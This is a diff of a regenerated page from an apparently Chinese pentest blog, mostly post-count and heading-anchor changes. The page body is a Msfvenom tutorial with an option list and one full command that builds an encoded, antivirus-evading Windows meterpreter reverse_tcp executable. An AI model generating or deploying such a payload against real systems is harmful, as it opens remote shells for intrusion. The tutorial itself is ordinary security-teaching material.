@@ -155,7 +155,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">127</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -244,8 +244,8 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="Msfvenom">Msfvenom</h2>
-<h3 id="常用参数">常用参数</h3>
+    <div class="post-body" itemprop="articleBody"><h2><span id="msfvenom">Msfvenom</span><a href="#msfvenom" class="header-anchor">#</a></h2>
+<h3><span id="chang-yong-can-shu">常用参数</span><a href="#chang-yong-can-shu" class="header-anchor">#</a></h3>
 <p>-p  指定 payload<br>
 -f  指定输出格式<br>
 -e  指定使用的 encoder 编码免杀<br>
@@ -262,7 +262,7 @@
 <span id="more"></span>
 <p>生成一个 Windows 平台的 payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 —platform Windows -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
-<h2 id="漏洞利用流程">漏洞利用流程</h2>
+<h2><span id="lou-dong-li-yong-liu-cheng">漏洞利用流程</span><a href="#lou-dong-li-yong-liu-cheng" class="header-anchor">#</a></h2>
 
     </div>
 
